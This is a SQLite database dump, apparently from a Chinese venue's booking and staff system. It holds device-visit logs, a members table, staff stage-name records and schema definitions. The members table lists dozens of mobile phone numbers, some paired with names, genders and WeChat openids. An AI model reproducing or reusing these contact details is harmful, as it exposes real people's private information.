INSERT INTO device_visits VALUES(659,'600f8455','2026-04-04','2026-04-04 16:17:19');
INSERT INTO device_visits VALUES(660,'687fbb83','2026-04-04','2026-04-04 17:15:11');
INSERT INTO device_visits VALUES(661,'73d9d9bc','2026-04-04','2026-04-04 17:16:03');
INSERT INTO device_visits VALUES(662,'62fa1b2c','2026-04-04','2026-04-04 18:20:29');
INSERT INTO device_visits VALUES(663,'28c536f8','2026-04-04','2026-04-04 19:27:19');
INSERT INTO device_visits VALUES(664,'153a8796','2026-04-04','2026-04-04 22:34:56');
INSERT INTO device_visits VALUES(665,'7a67e4c7','2026-04-05','2026-04-05 02:46:16');
INSERT INTO device_visits VALUES(666,'65d3ef06','2026-04-05','2026-04-05 03:34:41');
INSERT INTO device_visits VALUES(667,'4c9c30b9','2026-04-05','2026-04-05 03:54:05');
INSERT INTO device_visits VALUES(668,'1f287b2d','2026-04-05','2026-04-05 05:41:09');
INSERT INTO device_visits VALUES(669,'74f4224a','2026-04-05','2026-04-05 07:05:57');
INSERT INTO device_visits VALUES(670,'22071615','2026-04-05','2026-04-05 07:16:23');
INSERT INTO device_visits VALUES(671,'52b11baa','2026-04-05','2026-04-05 07:28:50');
INSERT INTO device_visits VALUES(672,'9ed6e7b','2026-04-05','2026-04-05 09:07:08');
INSERT INTO device_visits VALUES(673,'10929126','2026-04-05','2026-04-05 09:13:11');
INSERT INTO device_visits VALUES(674,'3f8315f7','2026-04-05','2026-04-05 09:24:33');
INSERT INTO device_visits VALUES(675,'2c5bfa5f','2026-04-05','2026-04-05 10:06:54');
INSERT INTO device_visits VALUES(676,'312ba23d','2026-04-05','2026-04-05 10:53:48');
INSERT INTO device_visits VALUES(677,'6ee5256c','2026-04-05','2026-04-05 11:10:03');
INSERT INTO device_visits VALUES(678,'52baad5c','2026-04-05','2026-04-05 11:14:06');
INSERT INTO device_visits VALUES(679,'3ff3f7a7','2026-04-05','2026-04-05 11:18:30');
INSERT INTO device_visits VALUES(680,'75b8f380','2026-04-05','2026-04-05 11:20:30');
INSERT INTO device_visits VALUES(681,'2d0b90fa','2026-04-05','2026-04-05 11:21:15');
INSERT INTO device_visits VALUES(682,'153a8796','2026-04-05','2026-04-05 11:32:15');
INSERT INTO device_visits VALUES(683,'5b7a3eb6','2026-04-05','2026-04-05 11:32:44');
INSERT INTO device_visits VALUES(684,'5993e5a8','2026-04-05','2026-04-05 11:44:34');
INSERT INTO device_visits VALUES(685,'2146c47d','2026-04-05','2026-04-05 11:59:54');
INSERT INTO device_visits VALUES(686,'18d0378b','2026-04-05','2026-04-05 12:03:05');
INSERT INTO device_visits VALUES(687,'3970fd4b','2026-04-05','2026-04-05 12:21:12');
INSERT INTO device_visits VALUES(688,'34937cea','2026-04-05','2026-04-05 12:45:20');
INSERT INTO device_visits VALUES(689,'1571a510','2026-04-05','2026-04-05 13:06:37');
INSERT INTO device_visits VALUES(690,'309771a7','2026-04-05','2026-04-05 13:19:17');
INSERT INTO device_visits VALUES(691,'1312e54a','2026-04-05','2026-04-05 13:26:05');
INSERT INTO device_visits VALUES(692,'2cd0359','2026-04-05','2026-04-05 13:39:41');
INSERT INTO device_visits VALUES(693,'72e6e845','2026-04-05','2026-04-05 13:46:43');
INSERT INTO device_visits VALUES(694,'4ff2de45','2026-04-05','2026-04-05 13:46:51');
INSERT INTO device_visits VALUES(695,'6bedca04','2026-04-05','2026-04-05 13:55:52');
INSERT INTO device_visits VALUES(696,'5bea5e03','2026-04-05','2026-04-05 13:56:32');
INSERT INTO device_visits VALUES(697,'161b74cc','2026-04-05','2026-04-05 14:00:52');
INSERT INTO device_visits VALUES(698,'9cbab96','2026-04-05','2026-04-05 14:01:08');
INSERT INTO device_visits VALUES(699,'600f8455','2026-04-05','2026-04-05 14:01:25');
INSERT INTO device_visits VALUES(700,'b685b16','2026-04-05','2026-04-05 14:05:20');
INSERT INTO device_visits VALUES(701,'62fa1b2c','2026-04-05','2026-04-05 14:44:32');
INSERT INTO device_visits VALUES(702,'5fbe4c1d','2026-04-05','2026-04-05 15:09:39');
INSERT INTO device_visits VALUES(703,'608ee2d7','2026-04-05','2026-04-05 16:04:04');
INSERT INTO device_visits VALUES(704,'25c11f76','2026-04-05','2026-04-05 16:09:29');
INSERT INTO device_visits VALUES(705,'22594cb4','2026-04-05','2026-04-05 16:20:38');
INSERT INTO device_visits VALUES(706,'68fa7d67','2026-04-05','2026-04-05 17:14:23');
INSERT INTO device_visits VALUES(707,'3fbf7edf','2026-04-05','2026-04-05 17:14:27');
INSERT INTO device_visits VALUES(708,'3ea6e3bd','2026-04-05','2026-04-05 18:49:40');
INSERT INTO device_visits VALUES(709,'37a6aa46','2026-04-05','2026-04-05 22:58:56');
INSERT INTO device_visits VALUES(710,'56c88ca0','2026-04-06','2026-04-06 00:05:43');
INSERT INTO device_visits VALUES(711,'41c403e9','2026-04-06','2026-04-06 00:26:31');
INSERT INTO device_visits VALUES(712,'fce9e6e','2026-04-06','2026-04-06 00:26:51');
INSERT INTO device_visits VALUES(713,'13e21ba2','2026-04-06','2026-04-06 05:47:53');
INSERT INTO device_visits VALUES(714,'52b11baa','2026-04-06','2026-04-06 06:14:20');
INSERT INTO device_visits VALUES(715,'397920bd','2026-04-06','2026-04-06 07:56:34');
INSERT INTO device_visits VALUES(716,'4c9c30b9','2026-04-06','2026-04-06 08:31:38');
INSERT INTO device_visits VALUES(717,'9ac0020','2026-04-06','2026-04-06 09:14:38');
INSERT INTO device_visits VALUES(718,'1b241b1a','2026-04-06','2026-04-06 09:59:57');
INSERT INTO device_visits VALUES(719,'3970fd4b','2026-04-06','2026-04-06 10:01:18');
INSERT INTO device_visits VALUES(720,'6bedca04','2026-04-06','2026-04-06 10:45:39');
INSERT INTO device_visits VALUES(721,'10d09273','2026-04-06','2026-04-06 11:02:09');
INSERT INTO device_visits VALUES(722,'2ddb06dc','2026-04-06','2026-04-06 11:02:21');
INSERT INTO device_visits VALUES(723,'7fb62182','2026-04-06','2026-04-06 11:07:51');
INSERT INTO device_visits VALUES(724,'63919e04','2026-04-06','2026-04-06 11:14:41');
INSERT INTO device_visits VALUES(725,'5be04058','2026-04-06','2026-04-06 12:23:58');
INSERT INTO device_visits VALUES(726,'6953430d','2026-04-06','2026-04-06 13:38:01');
INSERT INTO device_visits VALUES(727,'600f8455','2026-04-06','2026-04-06 13:54:03');
INSERT INTO device_visits VALUES(728,'5384a9b','2026-04-06','2026-04-06 14:16:14');
INSERT INTO device_visits VALUES(729,'2c4b9e0','2026-04-06','2026-04-06 14:16:23');
INSERT INTO device_visits VALUES(730,'42c9cc23','2026-04-06','2026-04-06 14:20:28');
INSERT INTO device_visits VALUES(731,'312ba23d','2026-04-06','2026-04-06 14:36:14');
INSERT INTO device_visits VALUES(732,'30e59b77','2026-04-06','2026-04-06 14:37:09');
INSERT INTO device_visits VALUES(733,'13cfc5a3','2026-04-06','2026-04-06 14:37:11');
INSERT INTO device_visits VALUES(734,'47fc7269','2026-04-06','2026-04-06 14:37:21');
INSERT INTO device_visits VALUES(735,'457bbb1f','2026-04-06','2026-04-06 14:37:23');
INSERT INTO device_visits VALUES(736,'677f5617','2026-04-06','2026-04-06 14:37:23');
INSERT INTO device_visits VALUES(737,'6c9c9c89','2026-04-06','2026-04-06 14:43:50');
INSERT INTO device_visits VALUES(738,'ae5233e','2026-04-06','2026-04-06 14:49:25');
INSERT INTO device_visits VALUES(739,'157b1d6d','2026-04-06','2026-04-06 15:13:27');
INSERT INTO device_visits VALUES(740,'7df70b1a','2026-04-06','2026-04-06 15:19:35');
INSERT INTO device_visits VALUES(741,'6103bde2','2026-04-06','2026-04-06 15:35:14');
INSERT INTO device_visits VALUES(742,'434484ed','2026-04-06','2026-04-06 16:30:58');
INSERT INTO device_visits VALUES(743,'55c0a728','2026-04-06','2026-04-06 17:47:11');
INSERT INTO device_visits VALUES(744,'470f0b39','2026-04-06','2026-04-06 18:31:20');
INSERT INTO device_visits VALUES(745,'30982f6e','2026-04-06','2026-04-06 19:36:50');
INSERT INTO device_visits VALUES(746,'2b0e3885','2026-04-06','2026-04-06 22:44:10');
INSERT INTO device_visits VALUES(747,'68fa7d67','2026-04-06','2026-04-06 23:43:10');
INSERT INTO device_visits VALUES(748,'3ac9ca0d','2026-04-07','2026-04-07 00:53:38');
INSERT INTO device_visits VALUES(749,'789bf771','2026-04-07','2026-04-07 00:53:48');
INSERT INTO device_visits VALUES(750,'219a3281','2026-04-07','2026-04-07 03:34:52');
INSERT INTO device_visits VALUES(751,'1535bdbd','2026-04-07','2026-04-07 03:44:26');
INSERT INTO device_visits VALUES(752,'4c9c30b9','2026-04-07','2026-04-07 03:58:53');
INSERT INTO device_visits VALUES(753,'5ebfc260','2026-04-07','2026-04-07 03:59:14');
INSERT INTO device_visits VALUES(754,'2990338f','2026-04-07','2026-04-07 03:59:17');
INSERT INTO device_visits VALUES(755,'755eab95','2026-04-07','2026-04-07 04:05:14');
INSERT INTO device_visits VALUES(756,'16892a7f','2026-04-07','2026-04-07 04:08:53');
INSERT INTO device_visits VALUES(757,'7a799dda','2026-04-07','2026-04-07 05:42:30');
INSERT INTO device_visits VALUES(758,'600b35bc','2026-04-07','2026-04-07 06:54:03');
INSERT INTO device_visits VALUES(759,'7a176cb2','2026-04-07','2026-04-07 07:39:25');
INSERT INTO device_visits VALUES(760,'3dd1ae0a','2026-04-07','2026-04-07 07:52:28');
INSERT INTO device_visits VALUES(761,'5a53b400','2026-04-07','2026-04-07 07:52:49');
INSERT INTO device_visits VALUES(762,'445ad277','2026-04-07','2026-04-07 07:56:37');
INSERT INTO device_visits VALUES(763,'2793010e','2026-04-07','2026-04-07 08:12:07');
INSERT INTO device_visits VALUES(764,'723d48e8','2026-04-07','2026-04-07 09:09:12');
INSERT INTO device_visits VALUES(765,'56ee8c2d','2026-04-07','2026-04-07 09:24:29');
INSERT INTO device_visits VALUES(766,'4b641d8c','2026-04-07','2026-04-07 09:25:13');
INSERT INTO device_visits VALUES(767,'74e63dfb','2026-04-07','2026-04-07 09:41:38');
INSERT INTO device_visits VALUES(768,'66b3d67c','2026-04-07','2026-04-07 11:00:26');
INSERT INTO device_visits VALUES(769,'52b11baa','2026-04-07','2026-04-07 11:06:43');
INSERT INTO device_visits VALUES(770,'5e8903dd','2026-04-07','2026-04-07 11:16:27');
INSERT INTO device_visits VALUES(771,'64891cb4','2026-04-07','2026-04-07 11:17:44');
INSERT INTO device_visits VALUES(772,'5be52ab6','2026-04-07','2026-04-07 11:49:08');
INSERT INTO device_visits VALUES(773,'a3fe83f','2026-04-07','2026-04-07 12:06:35');
INSERT INTO device_visits VALUES(774,'9ed6e7b','2026-04-07','2026-04-07 12:18:32');
INSERT INTO device_visits VALUES(775,'2b0e3885','2026-04-07','2026-04-07 12:29:21');
INSERT INTO device_visits VALUES(776,'a6718a4','2026-04-07','2026-04-07 12:53:05');
INSERT INTO device_visits VALUES(777,'14096736','2026-04-07','2026-04-07 13:17:28');
INSERT INTO device_visits VALUES(778,'4684c61e','2026-04-07','2026-04-07 13:25:09');
INSERT INTO device_visits VALUES(779,'58e168d4','2026-04-07','2026-04-07 13:27:04');
INSERT INTO device_visits VALUES(780,'32363614','2026-04-07','2026-04-07 13:36:27');
INSERT INTO device_visits VALUES(781,'382340af','2026-04-07','2026-04-07 14:01:04');
CREATE TABLE members (
  member_no INTEGER PRIMARY KEY AUTOINCREMENT,
  phone TEXT NOT NULL UNIQUE,
  openid TEXT,
  name TEXT,
  gender TEXT,
  remark TEXT,
  created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
  updated_at DATETIME DEFAULT CURRENT_TIMESTAMP
);
INSERT INTO members VALUES(1,'18680174119',NULL,'马美嵩','男',NULL,'2026-03-16 16:14:41','2026-04-07 18:20:43');
INSERT INTO members VALUES(2,'13078656656',NULL,NULL,'男',NULL,'2026-03-16 20:25:59','2026-04-07 17:41:44');
INSERT INTO members VALUES(3,'18420285039','oj5VJ1wNcV2TJDG97wPW7aDzntpY',NULL,NULL,NULL,'2026-03-16 22:50:13','2026-03-16 22:50:13');
INSERT INTO members VALUES(4,'18125367290','oj5VJ14bNiYZQr67-1tFhOxUBulA',NULL,NULL,NULL,'2026-03-17 13:39:52','2026-03-17 13:39:52');
INSERT INTO members VALUES(5,'13800138001',NULL,NULL,NULL,NULL,'2026-03-21 01:17:20','2026-03-21 01:17:20');
INSERT INTO members VALUES(6,'17573411899',NULL,NULL,NULL,NULL,'2026-03-24 18:27:30','2026-03-24 18:27:30');
INSERT INTO members VALUES(7,'15521597073',NULL,'陈嘉濠','男',NULL,'2026-03-24 18:36:06','2026-03-24 18:36:17');
INSERT INTO members VALUES(8,'13112924034',NULL,NULL,NULL,NULL,'2026-03-24 18:58:38','2026-03-24 18:58:59');
INSERT INTO members VALUES(9,'19928028091',NULL,'静香','女',NULL,'2026-03-24 20:10:57','2026-03-24 20:11:06');
INSERT INTO members VALUES(10,'15815702628',NULL,NULL,NULL,NULL,'2026-03-25 14:55:06','2026-03-25 14:55:06');
INSERT INTO members VALUES(11,'13760517760',NULL,'依','女',NULL,'2026-03-25 15:28:37','2026-03-25 23:57:54');
INSERT INTO members VALUES(12,'15323942411',NULL,'Kimi','女',NULL,'2026-03-25 22:57:24','2026-03-25 22:57:35');
INSERT INTO members VALUES(13,'17785656489',NULL,'周周','女',NULL,'2026-03-25 22:59:11','2026-03-25 23:00:31');
INSERT INTO members VALUES(14,'19994636903',NULL,'柳柳','女',NULL,'2026-03-25 23:02:09','2026-03-25 23:13:12');
INSERT INTO members VALUES(15,'19068078824',NULL,'三七','女',NULL,'2026-03-25 23:04:10','2026-03-25 23:59:07');
INSERT INTO members VALUES(16,'15362700631',NULL,NULL,NULL,NULL,'2026-03-25 23:08:32','2026-03-25 23:08:32');
INSERT INTO members VALUES(17,'15398309503',NULL,'四瑶','女',NULL,'2026-03-25 23:15:29','2026-03-25 23:15:43');
INSERT INTO members VALUES(18,'18925304483',NULL,NULL,NULL,NULL,'2026-03-25 23:48:40','2026-03-25 23:48:40');
INSERT INTO members VALUES(19,'18300052564',NULL,'三七',NULL,NULL,'2026-03-25 23:59:51','2026-03-25 23:59:57');
INSERT INTO members VALUES(20,'13432101600',NULL,NULL,NULL,NULL,'2026-03-26 00:00:08','2026-03-26 00:00:08');
INSERT INTO members VALUES(21,'18775703862',NULL,NULL,NULL,NULL,'2026-03-26 14:23:49','2026-03-26 14:23:49');
INSERT INTO members VALUES(22,'16675852676',NULL,'歪歪崽','女',NULL,'2026-03-26 15:54:25','2026-03-26 15:55:07');
INSERT INTO members VALUES(23,'15202088258',NULL,NULL,NULL,NULL,'2026-03-26 18:38:30','2026-03-26 18:38:30');
INSERT INTO members VALUES(24,'15675485090',NULL,'小涵','女',NULL,'2026-03-26 18:39:23','2026-03-26 18:39:43');
INSERT INTO members VALUES(25,'13590761730',NULL,'川','男',NULL,'2026-03-26 18:40:49','2026-03-26 18:41:01');
INSERT INTO members VALUES(26,'19860013436',NULL,'莫莫','女',NULL,'2026-03-26 18:42:53','2026-03-27 19:09:29');
INSERT INTO members VALUES(27,'13925567891',NULL,'方','男',NULL,'2026-03-26 18:53:20','2026-03-26 18:53:30');
INSERT INTO members VALUES(28,'13420329198',NULL,NULL,NULL,NULL,'2026-03-26 18:59:28','2026-03-26 18:59:28');
INSERT INTO members VALUES(29,'19938786749',NULL,'nn','女',NULL,'2026-03-26 19:16:22','2026-03-26 19:18:35');
INSERT INTO members VALUES(30,'13129256319',NULL,'50号禾子','女',NULL,'2026-03-26 19:29:58','2026-03-26 19:30:33');
INSERT INTO members VALUES(31,'13420347043',NULL,NULL,NULL,NULL,'2026-03-27 18:39:28','2026-03-27 18:39:28');
INSERT INTO members VALUES(32,'15016154044',NULL,NULL,NULL,NULL,'2026-03-27 18:39:46','2026-03-27 18:39:46');
INSERT INTO members VALUES(33,'17520240130',NULL,'芝芝','女',NULL,'2026-03-27 18:40:00','2026-03-27 18:40:12');
INSERT INTO members VALUES(34,'15907641078',NULL,NULL,NULL,NULL,'2026-03-27 18:40:52','2026-03-27 18:40:52');
INSERT INTO members VALUES(35,'13435711293',NULL,'女','女',NULL,'2026-03-27 18:40:54','2026-03-27 18:43:45');
INSERT INTO members VALUES(36,'15016142731',NULL,NULL,NULL,NULL,'2026-03-27 18:41:02','2026-03-27 18:41:02');
INSERT INTO members VALUES(37,'15362196411',NULL,'羊羊','女',NULL,'2026-03-27 18:41:04','2026-03-27 18:41:16');
INSERT INTO members VALUES(38,'14750820078',NULL,NULL,NULL,NULL,'2026-03-27 18:41:05','2026-03-27 18:43:04');
INSERT INTO members VALUES(39,'13435743450',NULL,NULL,'女',NULL,'2026-03-27 18:41:48','2026-03-27 18:46:22');
INSERT INTO members VALUES(40,'13157476309',NULL,NULL,NULL,NULL,'2026-03-27 18:46:23','2026-03-27 18:46:23');
INSERT INTO members VALUES(41,'15016149279',NULL,NULL,NULL,NULL,'2026-03-27 18:55:12','2026-03-27 18:55:12');
INSERT INTO members VALUES(42,'15989148331',NULL,'球球','女',NULL,'2026-03-27 19:09:04','2026-03-27 19:10:33');
INSERT INTO members VALUES(43,'15382776509',NULL,'雪梨','女',NULL,'2026-03-27 19:09:05','2026-03-27 19:09:25');
INSERT INTO members VALUES(44,'18475581285',NULL,'谢江江',NULL,NULL,'2026-03-27 19:10:06','2026-03-27 19:10:17');
INSERT INTO members VALUES(45,'13435764691',NULL,NULL,NULL,NULL,'2026-03-27 19:10:41','2026-03-27 19:10:41');
INSERT INTO members VALUES(46,'19814455887',NULL,NULL,NULL,NULL,'2026-03-27 19:20:59','2026-03-27 19:20:59');
INSERT INTO members VALUES(47,'19523854785',NULL,NULL,NULL,NULL,'2026-03-28 02:50:59','2026-03-28 02:50:59');
INSERT INTO members VALUES(48,'15089992393',NULL,'7k','女',NULL,'2026-03-28 21:28:18','2026-03-28 21:29:32');
INSERT INTO members VALUES(49,'15126799708',NULL,'女','女',NULL,'2026-03-31 20:19:35','2026-04-01 21:25:41');
INSERT INTO members VALUES(50,'13528155940',NULL,NULL,NULL,NULL,'2026-04-02 06:57:01','2026-04-02 07:31:50');
INSERT INTO members VALUES(51,'18576465663',NULL,NULL,NULL,NULL,'2026-04-04 09:07:05','2026-04-04 09:07:05');
INSERT INTO members VALUES(52,'15362141422',NULL,NULL,NULL,NULL,'2026-04-04 13:30:16','2026-04-04 13:30:16');
INSERT INTO members VALUES(53,'13144049395',NULL,'AA','女',NULL,'2026-04-05 19:13:11','2026-04-05 19:13:48');
INSERT INTO members VALUES(54,'15728487465',NULL,'61小茹','女',NULL,'2026-04-05 19:19:06','2026-04-05 19:50:16');
INSERT INTO members VALUES(55,'19960994972',NULL,'87寒寒',NULL,NULL,'2026-04-05 19:40:51','2026-04-05 19:41:02');
INSERT INTO members VALUES(56,'18664430926',NULL,'文婷','女',NULL,'2026-04-05 19:44:40','2026-04-05 19:44:52');
INSERT INTO members VALUES(57,'16676002806',NULL,NULL,NULL,NULL,'2026-04-05 20:17:26','2026-04-05 20:17:26');
CREATE TABLE device_blacklist (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        device_fingerprint TEXT NOT NULL UNIQUE,
        reason TEXT,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
        created_by TEXT
      );
CREATE TABLE system_config (key TEXT PRIMARY KEY, value TEXT, description TEXT, updated_at DATETIME DEFAULT CURRENT_TIMESTAMP);
INSERT INTO system_config VALUES('sms_provider','kltx','短信服务商: aliyun / kltx','2026-03-27 11:27:48');
CREATE TABLE water_boards (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        coach_no TEXT NOT NULL,
        stage_name TEXT NOT NULL,
        status TEXT DEFAULT '下班',
        table_no TEXT,
        updated_at DATETIME DEFAULT CURRENT_TIMESTAMP,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
        UNIQUE(coach_no)
      );
INSERT INTO water_boards VALUES(1,'10001','歪歪','下班',NULL,'2026-04-08 11:48:14','2026-04-08 11:48:14');
INSERT INTO water_boards VALUES(2,'10009','momo','下班',NULL,'2026-04-08 11:48:14','2026-04-08 11:48:14');
INSERT INTO water_boards VALUES(3,'10022','四瑶','下班',NULL,'2026-04-08 11:48:14','2026-04-08 11:48:14');
INSERT INTO water_boards VALUES(4,'10010',' 小怡','下班',NULL,'2026-04-08 11:48:14','2026-04-08 11:48:14');
INSERT INTO water_boards VALUES(5,'10011','十七','下班',NULL,'2026-04-08 11:48:14','2026-04-08 11:48:14');
INSERT INTO water_boards VALUES(6,'10079','文婷','下班',NULL,'2026-04-08 11:48:14','2026-04-08 11:48:14');
INSERT INTO water_boards VALUES(7,'10012','柳柳','下班',NULL,'2026-04-08 11:48:14','2026-04-08 11:48:14');
INSERT INTO water_boards VALUES(8,'10013','雪梨','下班',NULL,'2026-04-08 11:48:14','2026-04-08 11:48:14');
INSERT INTO water_boards VALUES(9,'10014','静香','下班',NULL,'2026-04-08 11:48:14','2026-04-08 11:48:14');
INSERT INTO water_boards VALUES(10,'10015','莫莫','下班',NULL,'2026-04-08 11:48:14','2026-04-08 11:48:14');
INSERT INTO water_boards VALUES(11,'10016','茜茜','下班',NULL,'2026-04-08 11:48:14','2026-04-08 11:48:14');
INSERT INTO water_boards VALUES(12,'10002','陆飞','下班',NULL,'2026-04-08 11:48:14','2026-04-08 11:48:14');
INSERT INTO water_boards VALUES(13,'10017','恩恩','下班',NULL,'2026-04-08 11:48:14','2026-04-08 11:48:14');
INSERT INTO water_boards VALUES(14,'10018','球球','下班',NULL,'2026-04-08 11:48:14','2026-04-08 11:48:14');
INSERT INTO water_boards VALUES(15,'10020','小土豆','下班',NULL,'2026-04-08 11:48:14','2026-04-08 11:48:14');
INSERT INTO water_boards VALUES(16,'10021','周周','下班',NULL,'2026-04-08 11:48:14','2026-04-08 11:48:14');
INSERT INTO water_boards VALUES(17,'10073','安娜','下班',NULL,'2026-04-08 11:48:14','2026-04-08 11:48:14');
INSERT INTO water_boards VALUES(18,'10074','晚晚','下班',NULL,'2026-04-08 11:48:14','2026-04-08 11:48:14');
INSERT INTO water_boards VALUES(19,'10023','小白','下班',NULL,'2026-04-08 11:48:14','2026-04-08 11:48:14');
INSERT INTO water_boards VALUES(20,'10024','逍遥','下班',NULL,'2026-04-08 11:48:14','2026-04-08 11:48:14');
INSERT INTO water_boards VALUES(21,'10025','青子','下班',NULL,'2026-04-08 11:48:14','2026-04-08 11:48:14');
INSERT INTO water_boards VALUES(22,'10003','六六','下班',NULL,'2026-04-08 11:48:14','2026-04-08 11:48:14');
INSERT INTO water_boards VALUES(23,'10026','江江','下班',NULL,'2026-04-08 11:48:14','2026-04-08 11:48:14');
INSERT INTO water_boards VALUES(24,'10027','小涵','下班',NULL,'2026-04-08 11:48:14','2026-04-08 11:48:14');
INSERT INTO water_boards VALUES(25,'10066','梦辰','下班',NULL,'2026-04-08 11:48:14','2026-04-08 11:48:14');
INSERT INTO water_boards VALUES(26,'10028','晴天','下班',NULL,'2026-04-08 11:48:14','2026-04-08 11:48:14');
INSERT INTO water_boards VALUES(27,'10030','多多','下班',NULL,'2026-04-08 11:48:14','2026-04-08 11:48:14');
INSERT INTO water_boards VALUES(28,'10031','芊芊','下班',NULL,'2026-04-08 11:48:14','2026-04-08 11:48:14');
INSERT INTO water_boards VALUES(29,'10032','三七','下班',NULL,'2026-04-08 11:48:14','2026-04-08 11:48:14');
INSERT INTO water_boards VALUES(30,'10033','饼饼','下班',NULL,'2026-04-08 11:48:14','2026-04-08 11:48:14');
INSERT INTO water_boards VALUES(31,'10034','羊羊','下班',NULL,'2026-04-08 11:48:14','2026-04-08 11:48:14');
INSERT INTO water_boards VALUES(32,'10035','晓墨','下班',NULL,'2026-04-08 11:48:14','2026-04-08 11:48:14');
INSERT INTO water_boards VALUES(33,'10036','快乐','下班',NULL,'2026-04-08 11:48:14','2026-04-08 11:48:14');
INSERT INTO water_boards VALUES(34,'10005','芝芝','下班',NULL,'2026-04-08 11:48:15','2026-04-08 11:48:15');
INSERT INTO water_boards VALUES(35,'10037','禾子','下班',NULL,'2026-04-08 11:48:15','2026-04-08 11:48:15');
INSERT INTO water_boards VALUES(36,'10038','露露','下班',NULL,'2026-04-08 11:48:15','2026-04-08 11:48:15');
INSERT INTO water_boards VALUES(37,'10082','敏儿','下班',NULL,'2026-04-08 11:48:15','2026-04-08 11:48:15');
INSERT INTO water_boards VALUES(38,'10059','诗雨','下班',NULL,'2026-04-08 11:48:15','2026-04-08 11:48:15');
INSERT INTO water_boards VALUES(39,'10078','小茹','下班',NULL,'2026-04-08 11:48:15','2026-04-08 11:48:15');
INSERT INTO water_boards VALUES(40,'10069','小晴','下班',NULL,'2026-04-08 11:48:15','2026-04-08 11:48:15');
INSERT INTO water_boards VALUES(41,'10070','kimi','下班',NULL,'2026-04-08 11:48:15','2026-04-08 11:48:15');
INSERT INTO water_boards VALUES(42,'10039','六九','下班',NULL,'2026-04-08 11:48:15','2026-04-08 11:48:15');
INSERT INTO water_boards VALUES(43,'10007','小月','下班',NULL,'2026-04-08 11:48:15','2026-04-08 11:48:15');
INSERT INTO water_boards VALUES(44,'10080','kiki','下班',NULL,'2026-04-08 11:48:15','2026-04-08 11:48:15');
INSERT INTO water_boards VALUES(45,'10060','7k','下班',NULL,'2026-04-08 11:48:15','2026-04-08 11:48:15');
INSERT INTO water_boards VALUES(46,'10008','小雨','下班',NULL,'2026-04-08 11:48:15','2026-04-08 11:48:15');
INSERT INTO water_boards VALUES(47,'10083','AA','下班',NULL,'2026-04-08 11:48:15','2026-04-08 11:48:15');
INSERT INTO water_boards VALUES(48,'10064','小涵','下班',NULL,'2026-04-08 11:48:15','2026-04-08 11:48:15');
INSERT INTO water_boards VALUES(49,'10065','多多','下班',NULL,'2026-04-08 11:48:15','2026-04-08 11:48:15');
INSERT INTO water_boards VALUES(50,'10075','寒寒','下班',NULL,'2026-04-08 11:48:15','2026-04-08 11:48:15');
INSERT INTO water_boards VALUES(51,'10072','莲宝','下班',NULL,'2026-04-08 11:48:15','2026-04-08 11:48:15');
INSERT INTO water_boards VALUES(52,'10077','MS','下班',NULL,'2026-04-08 11:48:15','2026-04-08 11:48:15');
INSERT INTO water_boards VALUES(53,'10056','逍遥','下班',NULL,'2026-04-08 11:48:15','2026-04-08 11:48:15');
INSERT INTO water_boards VALUES(54,'10040','豆豆','下班',NULL,'2026-04-08 11:48:15','2026-04-08 11:48:15');
CREATE TABLE service_orders (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        order_time DATETIME DEFAULT CURRENT_TIMESTAMP,
        table_no TEXT NOT NULL,
        requirement TEXT NOT NULL,
        requester_name TEXT NOT NULL,
        requester_type TEXT DEFAULT '助教',
        status TEXT DEFAULT '待处理',
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
        updated_at DATETIME DEFAULT CURRENT_TIMESTAMP
      );
CREATE TABLE table_action_orders (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        order_time DATETIME DEFAULT CURRENT_TIMESTAMP,
        table_no TEXT NOT NULL,
        coach_no TEXT NOT NULL,
        order_type TEXT NOT NULL,
        action_category TEXT,
        stage_name TEXT NOT NULL,
        status TEXT DEFAULT '待处理',
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
        updated_at DATETIME DEFAULT CURRENT_TIMESTAMP
      );
CREATE TABLE applications (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        applicant_phone TEXT NOT NULL,
        application_type TEXT NOT NULL,
        remark TEXT,
        proof_image_url TEXT,
        status INTEGER DEFAULT 0,
        approver_phone TEXT,
        approve_time DATETIME,
        extra_data TEXT,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
        updated_at DATETIME DEFAULT CURRENT_TIMESTAMP
      );
CREATE TABLE guest_invitation_results (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        date TEXT NOT NULL,
        shift TEXT NOT NULL,
        coach_no TEXT NOT NULL,
        stage_name TEXT NOT NULL,
        invitation_image_url TEXT,
        result TEXT DEFAULT '待审查',
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
        updated_at DATETIME DEFAULT CURRENT_TIMESTAMP,
        reviewed_at DATETIME,
        reviewer_phone TEXT,
        UNIQUE(date, shift, coach_no)
      );
CREATE TABLE operation_logs (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        operator_phone TEXT NOT NULL,
        operator_name TEXT,
        operation_type TEXT NOT NULL,
        target_type TEXT,
        target_id INTEGER,
        old_value TEXT,
        new_value TEXT,
        remark TEXT,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
      );
DELETE FROM sqlite_sequence;
INSERT INTO sqlite_sequence VALUES('carts',278);
INSERT INTO sqlite_sequence VALUES('coaches',10083);
INSERT INTO sqlite_sequence VALUES('orders',131);
INSERT INTO sqlite_sequence VALUES('tables',81);
INSERT INTO sqlite_sequence VALUES('vip_rooms',12);
INSERT INTO sqlite_sequence VALUES('device_visits',781);
INSERT INTO sqlite_sequence VALUES('members',57);
INSERT INTO sqlite_sequence VALUES('water_boards',54);
CREATE INDEX idx_carts_session_id ON carts(session_id);
CREATE INDEX idx_tables_name_pinyin ON tables(name_pinyin);
CREATE INDEX idx_coaches_popularity ON coaches(popularity DESC);
CREATE INDEX idx_device_visits_date ON device_visits(visit_date);
CREATE INDEX idx_members_phone ON members(phone);
CREATE INDEX idx_members_openid ON members(openid);
CREATE UNIQUE INDEX idx_coaches_employee_stage_unique ON coaches(employee_id, stage_name);
CREATE INDEX idx_water_boards_status ON water_boards(status);
CREATE INDEX idx_water_boards_coach_no ON water_boards(coach_no);
CREATE INDEX idx_service_orders_status ON service_orders(status);
CREATE INDEX idx_service_orders_table_no ON service_orders(table_no);
